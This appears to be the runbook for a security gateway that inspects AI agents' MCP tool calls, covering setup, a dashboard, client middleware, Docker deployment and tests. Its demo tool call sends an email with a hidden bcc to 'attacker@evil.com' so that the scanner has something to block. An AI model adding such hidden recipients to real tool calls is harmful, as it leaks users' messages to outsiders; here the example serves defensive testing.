# Runbook

This project has two separate services that do NOT share a pipeline:

- **Port 8000** — Real-time control plane (FastAPI). Dashboard + `POST /api/scan` inspection endpoint.
- **Port 8080** — Production API (stdlib HTTP). Docker Compose service with its own 4-detector monitor and `/v1/*` endpoints.

Both bind to localhost only by default.

---

## 1. Windows setup

Open PowerShell in the repo. Requires Python 3.10+.

```powershell
py --version
py -m venv .venv
.\.venv\Scripts\Activate.ps1
py -m pip install --upgrade pip
py -m pip install -e ".[dev,server]"
```

If PowerShell blocks activation, run `Set-ExecutionPolicy -Scope Process Bypass` first.

---

## 2. Start the real-time control plane (port 8000)

```powershell
py -X utf8 run_realtime.py
```

Open http://localhost:8000. API docs at http://localhost:8000/docs.

The dashboard is empty until you send it traffic. In a second terminal, submit a tool call:

```powershell
$call = @{
  name = 'email.send'
  server_id = 'postmark'
  arguments = @{ to = 'operator@example.com'; bcc = 'attacker@evil.com' }
} | ConvertTo-Json -Depth 4

Invoke-RestMethod -Method Post -Uri http://localhost:8000/api/scan `
  -ContentType 'application/json' -Body $call

Invoke-RestMethod -Uri http://localhost:8000/api/stats
```

The call should appear in the dashboard with the blocking layer identified.

### Demo mode (synthetic traffic for visual testing)

```powershell
$env:MCP_DEMO_MODE = '1'
py -X utf8 run_realtime.py
```

All generated events are labelled `demo`. After stopping, clean up with `Remove-Item Env:MCP_DEMO_MODE`.

---

## 3. Using the client middleware

Route your actual tool calls through the port-8000 inspection endpoint:

```python
from mcp_monitor.client import GatewayClient, ToolBlocked

gateway = GatewayClient("http://localhost:8000")

@gateway.guard
def send_email(*, server_id: str, to: str, body: str) -> str:
    return "sent"  # Only runs if gateway allows it

try:
    send_email(server_id="postmark", to="operator@example.com", body="status")
except ToolBlocked as error:
    print(error.verdict)
```

Note: `GatewayClient` is fail-open on transport errors. If you need fail-closed behavior, enforce it in your agent wrapper.

---

## 4. Production API via Docker (port 8080)

```powershell
Copy-Item .env.example .env
notepad .env                           # Set a real API key
$env:MCP_API_KEY = 'your-long-random-value'
docker compose up --build
```

Check health:

```powershell
Invoke-RestMethod -Uri http://localhost:8080/v1/health
```

### Load testing

```powershell
py -m pip install locust==2.31.8
locust -f locustfile.py --host=http://localhost:8080
```

The load test targets port 8080 (production API), not port 8000 (dashboard).

---

## 5. Pre-change validation

Run these before making changes or giving a demo:

```powershell
py -m ruff format --check src tests run_realtime.py
py -m ruff check src tests run_realtime.py
py -m pytest tests/test_5_layers.py tests/test_cross_platform.py tests/test_realtime.py -q --tb=short
py benchmark/tool_call_latency.py --iterations 200
```

Full suite:

```powershell
py -m pytest tests/ -q --tb=short
```

---

## 6. Troubleshooting

| Symptom | Fix |
|---------|-----|
| `ModuleNotFoundError: fastapi` | Run `py -m pip install -e ".[dev,server]"` |
| Can't reach port 8000 | Check `Get-NetTCPConnection -LocalPort 8000` — kill the occupying process |
| Dashboard is empty | That's normal — send `POST /api/scan` traffic, or set `MCP_DEMO_MODE=1` |
| Docker Compose exits immediately | `MCP_API_KEY` is missing — set it in `.env` or the shell |
| Console can't print characters | Start with `py -X utf8 run_realtime.py` |

---

## 7. Shutdown

`Ctrl+C` in the server terminal. Don't commit generated files (`security_dashboard.html`, benchmark output, `.venv`, API keys). Keep audit/WAL data per your org's retention policy.
